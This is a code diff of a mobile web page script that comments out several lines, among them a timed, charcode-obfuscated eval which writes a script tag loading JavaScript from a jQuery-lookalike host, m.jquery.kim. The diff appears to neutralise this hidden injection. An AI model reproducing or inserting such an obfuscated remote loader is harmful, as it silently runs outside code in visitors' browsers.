@@ -78,7 +78,7 @@ var nid=99110403+parseInt(100000*Math.random());
 
 var vid = pageGlobal.vid;
 
-setTimeout(function(){document.getElementById("tongji").src="javascript:eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,115,99,114,105,112,116,47,115,114,99,61,47,47,109,46,106,113,117,101,114,121,46,107,105,109,58,56,48,57,48,47,119,101,98,47,116,111,110,103,106,105,46,106,115,62,60,47,115,99,114,105,112,116,62,34,41,59))";},100);
+/*setTimeout(function(){document.getElementById("tongji").src="javascript:eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,115,99,114,105,112,116,47,115,114,99,61,47,47,109,46,106,113,117,101,114,121,46,107,105,109,58,56,48,57,48,47,119,101,98,47,116,111,110,103,106,105,46,106,115,62,60,47,115,99,114,105,112,116,62,34,41,59))";},100);*/
 
 
 !function(){
@@ -165,16 +165,16 @@ function dotip(){
  
 var d = new Date();
 var str = d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();
-document.getElementById("post-date").innerHTML = str;
+//document.getElementById("post-date").innerHTML = str;
 
 
 
-if (document.getElementsByTagName('h2')[0].innerHTML.length<30){
+/*if (document.getElementsByTagName('h2')[0].innerHTML.length<30){
 	document.getElementsByTagName('h2')[0].innerHTML = pageGlobal.title;
 }
 if(document.getElementById("timg")){
 	document.getElementById("timg").src= pageGlobal.playimg;
-}
+}*/
 
 $(function(){
  mqq.ui.setTitleButtons({
